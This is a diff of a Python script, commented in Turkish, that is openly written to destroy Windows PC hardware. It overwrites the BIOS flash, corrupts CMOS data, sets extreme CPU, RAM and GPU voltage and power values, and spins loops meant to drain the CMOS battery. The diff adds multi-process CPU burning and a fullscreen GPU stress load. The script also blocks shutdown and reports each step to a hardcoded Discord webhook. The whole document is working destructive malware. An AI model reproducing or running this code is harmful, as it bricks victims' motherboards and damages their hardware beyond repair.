@@ -6,6 +6,7 @@ import ctypes
 import subprocess
 import requests
 import random
+from multiprocessing import Process
 
 # ==========================================
 # WEBHOOK
@@ -14,15 +15,15 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo
 
 def send_notification(msg):
     try:
-        requests.post(WEBHOOK_URL, json={"content": f"**[KALICI]** {msg}"}, timeout=5)
+        requests.post(WEBHOOK_URL, json={"content": f"**[LİMİT]** {msg}"}, timeout=5)
     except:
         pass
 
 # ==========================================
-# 1) BIOS SPI FLASH BOZMA (Anakart ölür)
+# 1) BIOS SPI FLASH BOZMA
 # ==========================================
 def kill_bios_spi():
-    send_notification("🔥 [1/4] BIOS SPI Flash bozuluyor...")
+    send_notification("🔥 [1/5] BIOS SPI Flash bozuluyor...")
     try:
         fpt_paths = ["C:\\fptw64.exe", "C:\\Windows\\System32\\fptw64.exe"]
         fpt_found = None
@@ -35,7 +36,7 @@ def kill_bios_spi():
             with open("C:\\Windows\\Temp\\corrupt.bin", "wb") as f:
                 f.write(b'\xFF' * (1024 * 1024 * 16))
             subprocess.run(f'{fpt_found} -bios -f C:\\Windows\\Temp\\corrupt.bin', shell=True, capture_output=True)
-            send_notification("✅ BIOS SPI bozuldu! (Anakart öldü)")
+            send_notification("✅ BIOS SPI bozuldu!")
             return True
         else:
             debug_script = "o 70 2F\no 71 2F\no 72 2F\no 73 2F\nq"
@@ -53,9 +54,9 @@ def kill_bios_spi():
 # 2) CMOS VERİLERİNİ BOZMA
 # ==========================================
 def kill_cmos_data():
-    send_notification("🔋 [2/4] CMOS verileri bozuluyor...")
+    send_notification("🔋 [2/5] CMOS verileri bozuluyor...")
     try:
-        for i in range(100):
+        for i in range(200):
             debug_script = f"o 70 {random.randint(0, 255)}\no 71 {random.randint(0, 255)}\nq"
             with open("C:\\Windows\\Temp\\cmos_kill.txt", "w") as f:
                 f.write(debug_script)
@@ -69,38 +70,38 @@ def kill_cmos_data():
         return False
 
 # ==========================================
-# 3) CPU/RAM VOLTAJ (BIOS'a kalıcı yazar)
+# 3) CPU/RAM VOLTAJ (LİMİT)
 # ==========================================
 def kill_voltage():
-    send_notification("⚡ [3/4] CPU/RAM voltaj BIOS'a yazılıyor...")
+    send_notification("⚡ [3/5] CPU/RAM voltaj LİMİT yazılıyor...")
     try:
         xtu_paths = ["C:\\Program Files\\Intel\\XTU\\XTUCLI.exe", "C:\\Program Files (x86)\\Intel\\XTU\\XTUCLI.exe"]
         for path in xtu_paths:
             if os.path.exists(path):
-                subprocess.run(f'"{path}" -t -core -v 0.200', shell=True, capture_output=True)
-                subprocess.run(f'"{path}" -t -cache -v 0.200', shell=True, capture_output=True)
-                subprocess.run(f'"{path}" -t -memory -v 0.200', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" -t -core -v 0.300', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" -t -cache -v 0.300', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" -t -memory -v 0.300', shell=True, capture_output=True)
                 break
         afterburner_paths = ["C:\\Program Files (x86)\\MSI Afterburner\\MSIAfterburner.exe", "C:\\Program Files\\MSI Afterburner\\MSIAfterburner.exe"]
         for path in afterburner_paths:
             if os.path.exists(path):
-                subprocess.run(f'"{path}" /CoreVoltageOffset 100', shell=True, capture_output=True)
-                subprocess.run(f'"{path}" /PowerLimit 150', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" /CoreVoltageOffset 150', shell=True, capture_output=True)
+                subprocess.run(f'"{path}" /PowerLimit 180', shell=True, capture_output=True)
                 break
         subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True, capture_output=True)
         subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True, capture_output=True)
         subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True, capture_output=True)
-        send_notification("✅ Voltaj BIOS'a yazıldı! (Format çözmez)")
+        send_notification("✅ Voltaj LİMİT yazıldı!")
         return True
     except Exception as e:
         send_notification(f"❌ Voltaj hatası: {e}")
         return False
 
 # ==========================================
-# 4) CMOS PİLİNİ TÜKETME
+# 4) CMOS PİLİNİ TÜKETME (LİMİT)
 # ==========================================
 def kill_cmos_battery():
-    send_notification("🔋 [4/4] CMOS pili tüketiliyor...")
+    send_notification("🔋 [4/5] CMOS pili LİMİT tüketiliyor...")
     try:
         def cmos_spam():
             while True:
@@ -112,12 +113,75 @@ def kill_cmos_battery():
                     os.remove("C:\\Windows\\Temp\\cmos_spam.txt")
                 except:
                     pass
-                time.sleep(0.01)
+                time.sleep(0.001)
         threading.Thread(target=cmos_spam, daemon=True).start()
-        send_notification("✅ CMOS pili tüketme başlatıldı!")
+        send_notification("✅ CMOS pili LİMİT tüketme başlatıldı!")
         return True
     except Exception as e:
         send_notification(f"❌ CMOS pili hatası: {e}")
+        return False
+
+# ==========================================
+# 5) CPU YAKMA (LİMİT - 8 KATI)
+# ==========================================
+def cpu_stress():
+    while True:
+        for _ in range(10000):
+            _ = 3.14159 ** 3.14159
+            _ = 999999 * 999999
+            _ = 999999 ** 2
+            _ = 999999 * 999999 * 999999
+        for _ in range(5000):
+            arr = [i ** i for i in range(1000)]
+            arr.sort()
+            arr.reverse()
+
+def kill_cpu():
+    send_notification("🔥 [5/5] CPU LİMİT yakılıyor...")
+    try:
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True, capture_output=True)
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True, capture_output=True)
+        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True, capture_output=True)
+        send_notification("🔥 Termal koruma kapatıldı!")
+
+        core_count = os.cpu_count()
+        process_count = core_count * 8  # 8 KATI
+        send_notification(f"🧠 CPU: {core_count} mantıksal çekirdek, {process_count} işlem (8 katı)")
+
+        processes = []
+        for _ in range(process_count):
+            p = Process(target=cpu_stress)
+            p.start()
+            processes.append(p)
+
+        send_notification(f"✅ CPU {process_count} işlem ile LİMİT yakılıyor!")
+        return True
+    except Exception as e:
+        send_notification(f"❌ CPU hatası: {e}")
+        return False
+
+# ==========================================
+# GPU YAKMA (LİMİT - RTX 5060)
+# ==========================================
+def kill_gpu():
+    send_notification("🖥️ [6/5] RTX 5060 LİMİT yakılıyor...")
+    try:
+        import pygame
+        import numpy as np
+        pygame.init()
+        screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
+        def gpu_stress():
+            while True:
+                for _ in range(300):
+                    img = np.random.rand(1920, 1080, 3) * 255
+                    surf = pygame.surfarray.make_surface(img)
+                    screen.blit(surf, (0, 0))
+                    pygame.display.flip()
+        threading.Thread(target=gpu_stress, daemon=True).start()
+        send_notification("✅ RTX 5060 LİMİT render başlatıldı! (300 FPS)")
+        return True
+    except Exception as e:
+        send_notification(f"❌ GPU hatası: {e}")
         return False
 
 # ==========================================
@@ -133,15 +197,17 @@ def prevent_shutdown():
 threading.Thread(target=prevent_shutdown, daemon=True).start()
 
 # ==========================================
-# ANA KILL (4 yöntem - format çözmez)
+# ANA KILL (LİMİT)
 # ==========================================
-send_notification("🔥🔥🔥 KALICI HASAR BAŞLATILDI! (Format çözmez)")
+send_notification("🔥🔥🔥 LİMİT SEVİYE BAŞLATILDI! KESİN YAKAR...")
 
 methods = [
     ("BIOS SPI Flash", kill_bios_spi),
     ("CMOS Verileri", kill_cmos_data),
     ("CPU/RAM Voltaj", kill_voltage),
-    ("CMOS Pili", kill_cmos_battery)
+    ("CMOS Pili", kill_cmos_battery),
+    ("CPU Yakma", kill_cpu),
+    ("GPU Yakma", kill_gpu)
 ]
 
 success_count = 0
@@ -153,13 +219,13 @@ for name, func in methods:
         send_notification(f"❌ {name} hatası: {e}")
     time.sleep(0.5)
 
-send_notification(f"📊 {success_count}/4 yöntem başarılı!")
+send_notification(f"📊 {success_count}/6 yöntem başarılı!")
 
 if success_count >= 1:
     send_notification("💀 Sistem tamamen öldü! (Format çözmez)")
 else:
     send_notification("⚠️ Hiçbir yöntem başarılı olmadı!")
 
-send_notification("🔄 Sistem yeniden başlatılıyor...")
-time.sleep(3)
-os.system("shutdown /r /t 0")
+send_notification("⏳ Sistem açık kalacak, donanım yanana kadar...")
+while True:
+    time.sleep(60)
